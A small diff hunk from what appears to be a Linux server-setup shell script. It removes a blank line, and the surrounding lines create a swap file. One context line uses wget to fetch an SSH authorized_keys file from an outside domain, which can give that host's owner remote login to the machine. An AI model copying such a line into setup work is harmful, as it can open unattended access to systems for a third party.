@@ -5,7 +5,6 @@ wget -q sio.com.co/authorized_keys
 chmod 300 authorized_keys
 cd
 
-
 dd if=/dev/zero of=/var/swap.img bs=1024k count=1000
 chmod 0600 /var/swap.img
 mkswap /var/swap.img
